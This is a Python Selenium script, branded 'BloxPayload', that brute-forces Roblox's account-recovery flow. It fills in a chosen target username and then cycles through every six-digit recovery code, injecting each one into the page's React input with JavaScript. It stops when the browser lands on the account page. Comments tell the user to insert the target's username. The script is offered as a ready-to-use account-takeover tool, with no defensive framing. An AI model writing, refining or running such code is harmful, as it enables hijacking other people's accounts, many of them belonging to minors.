from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
import time
import os

# --- Configuration ---
START_URL = "https://www.roblox.com/login/forgot-password-or-username?identifier=username123" # change username123 to the target username
IDENTIFIER_VALUE = "example@gmail.com" # change this to any email you want, changing it to the email related to target email is recommended
CODE_FIELD_ID = "account-recovery-code-input"
IDENTIFIER_FIELD_ID = "inputIdentifier"
NEXT_BUTTON_XPATH = "//button[contains(text(), 'Next')]"
ERROR_MESSAGE_LOCATOR = (By.XPATH, "//div[contains(@class, 'error-text') and contains(text(), 'Invalid code.')]")

DRIVER_PATH = "chromedriver"


def brute_force_roblox_recovery_code_v11():
    print("=======================================================")
    print(" BloxPayload By yuhertz")
    print("=======================================================")
    driver = None

    if not os.path.exists(DRIVER_PATH):
        print(f"FATAL ERROR: Driver not found at {DRIVER_PATH}")
        return

    try:
        service = Service(executable_path=DRIVER_PATH)
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless')
        driver = webdriver.Chrome(service=service, options=options)
        driver.get(START_URL)
        print(f"✅ Navigated to: {START_URL}")

        wait = WebDriverWait(driver, 60)

        # --- STAGE 1: Initial Identifier Submission ---
        print("[STAGE 1/2] Submitting Identifier...")
        identifier_element = wait.until(EC.presence_of_element_located((By.ID, IDENTIFIER_FIELD_ID)))
        identifier_element.send_keys(IDENTIFIER_VALUE)

        next_button_stage1 = wait.until(EC.element_to_be_clickable((By.XPATH, NEXT_BUTTON_XPATH)))
        next_button_stage1.click()
        print("-> Identifier submitted. Waiting for code form to load...")
        time.sleep(10)

        # --- STAGE 2: Brute Force Loop ---
        print("\n[STAGE 2/2] Starting brute-force loop...")
        found_code = None
        total_attempts = 0

        SET_INPUT_JS = """
        function setReactInput(el, val) {
            var nativeInputValueSetter = Object.getOwnPropertyDescriptor(
                window.HTMLInputElement.prototype, 'value'
            ).set;
            nativeInputValueSetter.call(el, val);
            var inputEvent = new Event('input', { bubbles: true, cancelable: true });
            el.dispatchEvent(inputEvent);
            var changeEvent = new Event('change', { bubbles: true, cancelable: true });
            el.dispatchEvent(changeEvent);
        }
        setReactInput(arguments[0], arguments[1]);
        """

        for i in range(1000000):
            code = str(i).zfill(6)
            total_attempts += 1

            try:
                # =========================================================
                # V11 FIX: Wait for fresh element EVERY iteration
                # + wait for page to settle after previous submit
                # =========================================================

                # Wait for the page to settle before interacting
                time.sleep(1)

                # Always re-fetch the element fresh
                code_element = wait.until(EC.presence_of_element_located((By.ID, CODE_FIELD_ID)))

                # Click and clear
                code_element.click()
                time.sleep(0.1)

                # Clear using native setter
                driver.execute_script(SET_INPUT_JS, code_element, '')
                time.sleep(0.1)

                # Set the new code
                driver.execute_script(SET_INPUT_JS, code_element, code)
                time.sleep(0.1)

                # Send last char via send_keys to trigger React binding
                code_element.send_keys(code[-1])
                time.sleep(0.05)

                print(f"  > Set code: {code}")

                # Click submit
                submit_button = wait.until(EC.element_to_be_clickable((By.XPATH, NEXT_BUTTON_XPATH)))
                submit_button.click()

            except Exception as e:
                print(f"\n⚠️ Error on iteration {total_attempts} ({code}): {e}")
                # Don't break — wait and retry
                print("   Waiting 3 seconds and continuing...")
                time.sleep(3)
                continue

            print(f"Attempt: {code} / {total_attempts}", end='\r')

            # --- Validation ---
            try:
                wait.until(
                    EC.any_of([
                        EC.url_contains("my-account"),
                        EC.visibility_of_element_located(ERROR_MESSAGE_LOCATOR)
                    ])
                )
            except Exception:
                pass

            if driver.current_url.startswith("https://www.roblox.com/my-account"):
                print("\n" + "="*60)
                print(f"  SUCCESS! Code Found: {code} ")
                print("="*60)
                found_code = code
                break

            if "success" in driver.page_source.lower() or "verified" in driver.page_source.lower():
                 print("\n" + "="*60)
                 print(f" ✅ SUCCESS! Code Found: {code}")
                 print("="*60)
                 found_code = code
                 break

        if not found_code:
            print(f"\n\n❌ All {total_attempts} attempts finished. No code found.")

    except Exception as e:
        print(f"\n[FATAL ERROR] Unexpected error: {e}")

    finally:
        if driver:
            print("\nClosing browser.")
            driver.quit()


if __name__ == "__main__":
    brute_force_roblox_recovery_code_v11()
